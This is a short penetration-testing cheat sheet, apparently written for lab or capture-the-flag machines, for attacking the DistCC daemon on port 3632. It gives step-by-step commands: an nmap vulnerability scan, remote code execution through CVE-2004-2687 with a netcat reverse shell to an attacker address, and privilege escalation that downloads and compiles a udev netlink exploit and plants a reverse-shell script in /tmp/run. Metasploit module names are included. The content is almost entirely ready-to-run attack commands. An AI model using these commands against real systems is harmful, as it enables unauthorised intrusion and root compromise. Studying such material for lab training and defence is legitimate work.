# DistCC Daemon: Port 3632

1. Detect vulnerability

        nmap -Pn --script vuln -p3632 10.129.28.89

2. Get shell access using either of the following methods
   * [distccd_rce_CVE-2004-2687.py](https://gist.githubusercontent.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855/raw/48ab4eb0bd69cac67bc97fbe182e39e5ded99f9f/distccd_rce_CVE-2004-2687.py)

            python distccd_rce_CVE-2004-2687.py -t 10.10.10.4 -p 3632 -c "nc -e /bin/bash 10.10.11.2 4444"

   * [Metasploit](https://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec)

            use exploit/unix/misc/distcc_exec

3. Escalate privilege by either of the following methods
   * [Netlink 1.4.1](https://www.computersecuritystudent.com/SECURITY_TOOLS/METASPLOITABLE/EXPLOIT/lesson2/index.html)
  
        Attack `NETLINK 1.4.1`, as it does not verify whether a NETLINK message is originating from the kernel space or not. Local users can gain privilege by sending a NETLINK message from the user space (`/tmp/run`).

            $ wget --no-check-certificate http://www.computersecuritystudent.com/DOWNLOADS/8572 -O exploit-8572.c
            $ gcc exploit-8572.c -o exploit-8572
            $ echo '#!/bin/sh' > /tmp/run
            $ echo '/bin/netcat -e /bin/sh 10.10.10.2 4444' >> /tmp/run
            $ ps -eaf | grep udev | grep -v grep

        [1] Record your PID (2709), 
        [2] subtract 1 (2708), and 
        [3] supply new PID to the next step.

            $ ./exploit-8572 2708

   * [Metasploit](https://www.rapid7.com/db/modules/exploit/linux/local/udev_netlink)

            use exploit/linux/local/udev_netlink

## References

* https://www.rapid7.com/db/modules/exploit/unix/misc/distcc_exec
* https://nmap.org/nsedoc/scripts/distcc-cve2004-2687.html
* https://svn.nmap.org/nmap/scripts/distcc-cve2004-2687.nse
* https://www.computersecuritystudent.com/SECURITY_TOOLS/METASPLOITABLE/EXPLOIT/lesson2/index.html
* https://gist.githubusercontent.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855/raw/48ab4eb0bd69cac67bc97fbe182e39e5ded99f9f/distccd_rce_CVE-2004-2687.py
* https://www.exploit-db.com/exploits/21848
* https://www.rapid7.com/db/modules/exploit/linux/local/udev_netlink